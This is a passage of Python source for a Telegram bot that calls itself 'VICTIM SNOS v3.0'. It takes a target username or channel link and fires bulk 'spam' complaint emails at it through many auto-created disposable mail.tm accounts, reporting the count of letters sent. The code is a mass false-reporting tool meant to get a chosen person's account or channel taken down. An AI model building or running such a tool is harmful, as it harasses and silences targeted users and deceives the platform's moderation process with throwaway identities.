        "<b>ЖАЛОБА НА КАНАЛ</b>\n\nВведите ссылку на канал:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Отмена", callback_data="main_menu")]
        ])
    )
    await callback.answer()

@dp.message(StateFilter(ComplaintState.waiting_username))
async def process_complaint_username(message: types.Message, state: FSMContext):
    username = message.text.strip().replace("@", "")
    await state.clear()
    
    await message.answer("<b>Отправка жалоб...</b>")
    sent = await send_mass_complaint(mail_tm, username, "spam", False)
    
    await message.answer(f"<b>ГОТОВО!</b>\n\nОтправлено писем: {sent}", reply_markup=get_main_menu())

@dp.message(StateFilter(ComplaintState.waiting_links))
async def process_complaint_channel(message: types.Message, state: FSMContext):
    channel = message.text.strip()
    await state.clear()
    
    await message.answer("<b>Отправка жалоб...</b>")
    sent = await send_mass_complaint(mail_tm, channel, "spam", True)
    
    await message.answer(f"<b>ГОТОВО!</b>\n\nОтправлено писем: {sent}", reply_markup=get_main_menu())

@dp.callback_query(F.data == "stop_attack")
async def stop_attack(callback: types.CallbackQuery):
    await callback.message.edit_text("<b>Остановлено</b>", reply_markup=get_main_menu())
    await callback.answer()

# ---------- ЗАПУСК ----------
mail_tm = MailTM()

async def main():
    logger.info("VICTIM SNOS v3.0 запуск...")
    
    # Удаляем вебхук
    await bot.delete_webhook(drop_pending_updates=True)
    
    # Запускаем фоновую инициализацию сессий
    asyncio.create_task(init_sessions_background())
    
    # Инициализация mail.tm (тоже в фоне, но быстрее)
    if USE_MAILTM:
        try:
            with open('mailtm_accounts.json', 'r') as f:
                mail_tm.accounts = json.load(f)
                logger.info(f"Загружено {len(mail_tm.accounts)} mail.tm аккаунтов")
        except:
            logger.info("Создание mail.tm аккаунтов...")
            asyncio.create_task(create_mailtm_accounts())
    
    logger.info("Бот запущен и готов к работе!")
    
    # Запускаем polling (блокирующий вызов)
    await dp.start_polling(bot)

async def create_mailtm_accounts():
    """Фоновое создание mail.tm аккаунтов"""
    accounts = await mail_tm.create_multiple_accounts(MAILTM_ACCOUNTS_COUNT)
    with open('mailtm_accounts.json', 'w') as f:
        json.dump(accounts, f)
    mail_tm.accounts = accounts
    logger.info(f"Создано {len(accounts)} mail.tm аккаунтов")

if __name__ == "__main__":
    asyncio.run(main())
